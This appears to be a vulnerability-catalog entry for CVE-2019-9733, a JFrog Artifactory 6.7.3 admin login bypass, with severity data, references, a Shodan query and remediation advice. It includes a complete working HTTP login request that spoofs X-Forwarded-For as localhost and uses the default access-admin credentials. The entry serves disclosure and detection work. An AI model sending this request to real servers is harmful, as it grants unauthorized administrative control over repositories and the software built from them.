---
layout: post
cve_id: CVE-2019-9733
title: JFrog Artifactory 6.7.3 - Admin Login Bypass
pcap: true
pcap_path: /pcaps/2019/CVE-2019-9733.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-9733.yaml
snort2_rule: N/A
snort3_rule: N/A
author: akshansh
severity: critical
impact: 'Successful exploitation allows unauthorized access to the admin panel.

  '
remediation: 'Upgrade to a patched version of JFrog Artifactory or apply the necessary
  security patches.

  '
reference:
- http://packetstormsecurity.com/files/152172/JFrog-Artifactory-Administrator-Authentication-Bypass.html
- https://www.ciphertechs.com/jfrog-artifactory-advisory/
- https://www.jfrog.com/confluence/display/RTF/Release+Notes#ReleaseNotes-Artifactory6.8.6
- https://nvd.nist.gov/vuln/detail/CVE-2019-9733
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2019-9733
  epss-score: 0.91735
  epss-percentile: 0.99665
  cpe: cpe:2.3:a:jfrog:artifactory:6.7.3:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: jfrog
  product: artifactory
  shodan-query: cpe:"cpe:2.3:a:jfrog:artifactory"
tags:
- cve
- cve2019
- packetstorm
- artifactory
- login
- jfrog
- vkev
- vuln
---

## üîç Vulnerability Description
JFrog Artifactory 6.7.3 is vulnerable to an admin login bypass issue because by default the access-admin account is used to reset the password of the admin account. While this is only allowable from a connection directly from localhost, providing an X-Forwarded-For HTTP header to the request allows an unauthenticated user to login with the default credentials of the access-admin account while bypassing the whitelist of allowed IP addresses. The access-admin account can use Artifactory's API to request authentication tokens for all users including the admin account and, in turn, assume full control of all artifacts and repositories managed by Artifactory.

## üåê HTTP Request
```nohighlight
POST /artifactory/ui/auth/login?_spring_security_remember_me=false HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Connection: close
Content-Length: 60
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: http://www.victim.com
Referer: http://www.victim.com/artifactory/webapp/
Request-Agent: artifactoryUI
X-Forwarded-For: 127.0.0.1
X-Requested-With: artUI
Accept-Encoding: gzip
{"user":"access-admin","password":"password","type":"login"}
```

